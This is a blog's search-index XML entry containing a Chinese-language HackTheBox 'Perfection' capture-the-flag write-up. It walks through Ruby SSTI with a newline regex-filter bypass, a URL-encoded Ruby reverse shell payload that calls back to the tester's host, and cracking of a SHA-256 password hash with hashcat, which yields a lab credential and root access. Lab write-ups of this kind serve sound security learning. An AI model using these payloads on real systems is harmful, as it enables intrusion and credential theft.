<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Hackthebox-Perfection Writeup</title>
    <link href="/2024/07/12/Hackthebox-Perfection-Writeup/"/>
    <url>/2024/07/12/Hackthebox-Perfection-Writeup/</url>
    
    <content type="html"><![CDATA[<p><img src="/2024/07/12/Hackthebox-Perfection-Writeup/Perfection.png"></p><h2 id="信息蒐集"><a href="#信息蒐集" class="headerlink" title="信息蒐集"></a>信息蒐集</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><hr><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">─(x㉿kali)-[~]<br>└─$ <span class="hljs-built_in">export</span> ip=10.10.11.253<br>                                                                                   <br>┌──(x㉿kali)-[~]<br>└─$ <span class="hljs-built_in">mkdir</span> perfection; <span class="hljs-built_in">cd</span> perfection<br>                                                                                   <br>┌──(x㉿kali)-[~/perfection]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -Pn -sV -sC <span class="hljs-variable">$ip</span><br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-12 04:43 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.253<br>Host is up (0.18s latency).<br>Not shown: 998 closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   256 80:e4:79:e8:59:28:<span class="hljs-built_in">df</span>:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)<br>|_  256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)<br>80/tcp open  http    nginx<br>|_http-title: Weighted Grade Calculator<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 26.95 seconds<br></code></pre></td></tr></table></figure><p>發現兩個端口開放：</p><ul><li>22&#x2F;tcp open  ssh     OpenSSH 8.9p1</li><li>80&#x2F;tcp open  http    nginx</li></ul><h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><hr><p>進入網頁後發現這是一個計算加權成績的計算機。</p><p><img src="/2024/07/12/Hackthebox-Perfection-Writeup/image.png"></p><p>在<code>About Us</code>頁面中，顯示團隊有兩位成員<strong>smith</strong>和<strong>miller</strong>，頁腳顯示使用<strong>Webrick 1.7.0</strong>。</p><p><img src="/2024/07/12/Hackthebox-Perfection-Writeup/image-1.png"></p><p>Google後發現沒有漏洞可利用，看起來是沒有。</p><p>用wappalyzer插件看到網站使用了<strong>Ruby</strong>。</p><p><img src="/2024/07/12/Hackthebox-Perfection-Writeup/image-2.png"></p><p>進入&#x2F;weighted-grade頁面，發現有注入點。</p><p><img src="/2024/07/12/Hackthebox-Perfection-Writeup/image-3.png"></p><h3 id="注入payload"><a href="#注入payload" class="headerlink" title="注入payload"></a>注入payload</h3><hr><p>感覺有機會進行SSTI模板注入，用<a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">Hackthetricks</a>的payload <code>&lt;%= </code>id<code> %&gt;</code>試試看。</p><p>用burpsuite將payload用urlencode後發現被偵測為惡意行為。</p><p><img src="/2024/07/12/Hackthebox-Perfection-Writeup/image-4.png"></p><h3 id="繞過Ruby-Regex"><a href="#繞過Ruby-Regex" class="headerlink" title="繞過Ruby Regex"></a>繞過Ruby Regex</h3><p>發現這篇<a href="https://davidhamann.de/2022/05/14/bypassing-regular-expression-checks/">文章</a>提到Ruby的Regex可以用\n來繞過。將原本的payload改成：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">test</span><br>&lt;%= `<span class="hljs-built_in">id</span>` %&gt;<br></code></pre></td></tr></table></figure><p>urlencode後：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">test</span>%0A&lt;%25%3D`<span class="hljs-built_in">id</span>`+%25&gt;<br></code></pre></td></tr></table></figure><p>成功執行。</p><p><img src="/2024/07/12/Hackthebox-Perfection-Writeup/image-8.png"></p><p>接著去<a href="https://www.revshells.com/">https://www.revshells.com/</a> 生成一個urlencode的ruby reverse shell payload：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">test</span>%0A&lt;%25%3d+`ruby%20-rsocket%20-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%2210.10.14.53%22%2C9000%29%29%27`+%25&gt;<br></code></pre></td></tr></table></figure><p>在本地啟動netcat listener：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(x㉿kali)-[~]<br>└─$ nc -lvnp 9000                       <br>listening on [any] 9000 ...<br>connect to [10.10.14.53] from (UNKNOWN) [10.10.11.253] 49506<br></code></pre></td></tr></table></figure><h2 id="提權"><a href="#提權" class="headerlink" title="提權"></a>提權</h2><hr><h3 id="使用-Python-升級到完全交互式-shell"><a href="#使用-Python-升級到完全交互式-shell" class="headerlink" title="使用 Python 升級到完全交互式 shell"></a>使用 Python 升級到完全交互式 shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 -c <span class="hljs-string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="hljs-built_in">export</span> SHELL=bash<br><span class="hljs-built_in">export</span> TERM=xterm-256color<br></code></pre></td></tr></table></figure><p>按 <code>ctrl-z</code> 將shell送到後台：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">stty</span> raw -<span class="hljs-built_in">echo</span>; <span class="hljs-built_in">fg</span><br></code></pre></td></tr></table></figure><p>進行信息蒐集：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">susan@perfection:~/ruby_app$ <span class="hljs-built_in">id</span><br>uid=1001(susan) gid=1001(susan) <span class="hljs-built_in">groups</span>=1001(susan),27(<span class="hljs-built_in">sudo</span>)<br></code></pre></td></tr></table></figure><p>查看郵件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">susan@perfection:~$ <span class="hljs-built_in">ls</span> -la /var/mail<br>total 12<br>drwxrwsr-x 2 root mail 4096 May 14 2023 .<br>drwxr-xr-x 13 root root 4096 Oct 27 2023 ..<br>-rw-r----- 1 root susan 625 May 14 2023 susan<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">susan@perfection:~$ <span class="hljs-built_in">cat</span> /var/mail/susan<br>Due to our transition to Jupiter Grades because of the PupilPath data breach, I<br>thought we should also migrate our credentials (<span class="hljs-string">&#x27;our&#x27;</span> including the other<br>students<br><span class="hljs-keyword">in</span> our class) to the new platform. I also suggest a new password specification,<br>to make things easier <span class="hljs-keyword">for</span> everyone. The password format is:<br>&#123;firstname&#125;_&#123;firstname backwards&#125;_&#123;randomly generated <span class="hljs-built_in">integer</span> between 1 and<br>1,000,000,000&#125;<br>Note that all letters of the first name should be converted into lowercase.<br>Please hit me with updates on the migration when you can. I am currently<br>registering our university with the platform.<br>- Tina, your delightful student<br></code></pre></td></tr></table></figure><p>發現Migration文件夾：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">susan@perfection:~$ <span class="hljs-built_in">ls</span> -la Migration/<br>total 16<br>drwxr-xr-x 2 root root 4096 Oct 27 2023 .<br>drwxr-x--- 7 susan susan 4096 Feb 26 09:41 ..<br>-rw-r--r-- 1 root root 8192 May 14 2023 pupilpath_credentials.db<br></code></pre></td></tr></table></figure><p>查看資料庫文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> pupilpath_credentials.db<br></code></pre></td></tr></table></figure><p>取得hash：<code>abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f</code></p><p>辨識hash類型：<br><img src="/2024/07/12/Hackthebox-Perfection-Writeup/image-9.png"></p><h3 id="使用-Hashcat破解密碼"><a href="#使用-Hashcat破解密碼" class="headerlink" title="使用 Hashcat破解密碼"></a>使用 Hashcat破解密碼</h3><hr><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(x㉿kali)-[~]<br>└─$ hashcat -h | grep -i sha2-256    <span class="hljs-comment">#查看sha2-256的mode</span><br>   1400 | SHA2-256 <br><br>┌──(x㉿kali)-[~]<br>└─$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;susan_nasus_&quot;</span> &gt; word     <span class="hljs-comment">#前綴</span><br>                                                     <br>┌──(x㉿kali)-[~]<br>└─$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f&quot;</span> &gt;hash.txt<br><br>┌──(x㉿kali)-[~]<br>└─$ hashcat -m 1400 -a 6 hash.txt word ?d?d?d?d?d?d?d?d?d -O<br><br>hashcat (v6.2.6) starting<br><br>OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform <span class="hljs-comment">#1 [The pocl project]</span><br>==================================================================================================================================================<br>* Device <span class="hljs-comment">#1: cpu-skylake-avx512-11th Gen Intel(R) Core(TM) i5-11320H @ 3.20GHz, 6832/13729 MB (2048 MB allocatable), 8MCU</span><br><br>Minimum password length supported by kernel: 0<br>Maximum password length supported by kernel: 31<br><br>Hashes: 1 digests; 1 unique digests, 1 unique salts<br>Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates<br><br>Optimizers applied:<br>* Optimized-Kernel<br>* Zero-Byte<br>* Precompute-Init<br>* Early-Skip<br>* Not-Salted<br>* Not-Iterated<br>* Single-Hash<br>* Single-Salt<br>* Raw-Hash<br><br>Watchdog: Temperature abort trigger <span class="hljs-built_in">set</span> to 90c<br><br>Host memory required <span class="hljs-keyword">for</span> this attack: 2 MB<br><br>Dictionary cache built:<br>* Filename..: word<br>* Passwords.: 1<br>* Bytes.....: <br><br>13<br>* Keyspace..: 1000000000<br>* Runtime...: 0 secs<br><br>The wordlist or mask that you are using is too small.<br>This means that hashcat cannot use the full parallel power of your device(s).<br>Unless you supply more work, your cracking speed will drop.<br>For tips on supplying more work, see: https://hashcat.net/faq/morework<br><br>Approaching final keyspace - workload adjusted.           <br><br>Cracking performance lower than expected?                 <br><br>* Append -w 3 to the commandline.<br>  This can cause your screen to lag.<br><br>* Update your backend API runtime / driver the right way:<br>  https://hashcat.net/faq/wrongdriver<br><br>* Create more work items to make use of your parallelization power:<br>  https://hashcat.net/faq/morework<br><br>abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f:susan_nasus_413759210<br>                                                          <br>Session..........: hashcat<br>Status...........: Cracked<br>Hash.Mode........: 1400 (SHA2-256)<br>Hash.Target......: abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a3019934...39023f<br>Time.Started.....: Fri Jul 12 08:11:50 2024 (59 secs)<br>Time.Estimated...: Fri Jul 12 08:12:49 2024 (0 secs)<br>Kernel.Feature...: Optimized Kernel<br>Guess.Base.......: File (word), Left Side<br>Guess.Mod........: Mask (?d?d?d?d?d?d?d?d?d) [9], Right Side<br>Guess.Queue.Base.: 1/1 (100.00%)<br>Guess.Queue.Mod..: 1/1 (100.00%)<br>Speed.#1.........:  2036.5 kH/s (0.05ms) @ Accel:256 Loops:512 Thr:1 Vec:16<br>Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)<br>Progress.........: 125967360/1000000000 (12.60%)<br>Rejected.........: 0/125967360 (0.00%)<br>Restore.Point....: 0/1 (0.00%)<br>Restore.Sub.#1...: Salt:0 Amplifier:125966848-125967360 Iteration:0-512<br>Candidate.Engine.: Device Generator<br>Candidates.#1....: susan_nasus_758539210 -&gt; susan_nasus_643759210<br>Hardware.Mon.#1..: Temp: 52c Util: 26%<br></code></pre></td></tr></table></figure><p>取得密碼<code>susan_nasus_413759210</code>。</p><p>最後使用sudo權限查看root flag：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(x㉿kali)-[~]<br>└─$ <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">cat</span> /root/root.txt<br>&lt;flag&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hackthebox Machines</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
